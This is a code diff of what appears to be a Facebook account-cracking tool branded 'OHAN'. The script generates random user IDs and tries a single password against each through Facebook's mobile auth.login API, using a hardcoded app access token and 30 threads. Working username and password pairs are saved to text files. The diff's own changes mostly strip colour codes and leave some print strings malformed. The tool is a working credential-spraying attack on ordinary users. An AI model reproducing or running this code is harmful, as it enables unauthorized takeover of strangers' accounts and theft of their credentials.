@@ -331,7 +331,7 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ OHAN-OK ] {idf} | {pw}')
+				print(f'\r\x1b [ OHAN-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -410,7 +410,7 @@ class Main:
 		self.loop = 0
 		os.system("clear")
 		print(logo)
-		print("\n \t \t[1] 2009 - 2010 CLONE -- [BEST]")
+		print("\n[1] FOLLOW ME")
 		print("[2] 2011 - 2014 CLONE")
 		print("[3] FILE CLONE")
 		print("[4] PUBLIC CLONE  -- [GOOD] ")
@@ -845,13 +845,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \000[0;92m[ OHAN-OK ] %s | %s\000[0;97m         "%(uid, pw))
+				print("\r \000[ OHAN-OK ] %s | %s\000    "%(uid, pw))
 				print ("\r \333[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \053[0;92m[ OHAN-CP ] %s | %s\053[0;97m         "%(uid, pw))
+				print("\r \053[ OHAN-CP ] %s | %s\053      "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -865,20 +865,20 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \333[0;95m[+]\333[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \333[+]\333TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\333[0;93m [+] TOTAL ID -> \333[0;91m%s\333[0;97m"%(len(self.id))) 
+			print("\333[[+] TOTAL ID -> \333%s\333"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\333[1;32m [!] USE (123456) FOR IDZ\333[1;37m ")
+				print("\n\333[!] USE (123456) FOR IDZ\333")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\333[0;91m%s\333[0;93m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\333%s\333"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
@@ -1272,13 +1272,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \333[0;92m[ OHAN-OK ] %s | %s\333[0;97m         "%(uid, pw))
-				print ("\r \333[0;92m Congrats Bro ")
+				print("\r \333[ OHAN-OK ] %s | %s\333        "%(uid, pw))
+				print ("\r \333[ Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \333[0;92m[ OHAN-OK ] %s | %s\333[0;97m         "%(uid, pw))
+				print("\r \333 OHAN-OK ] %s | %s\333 "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
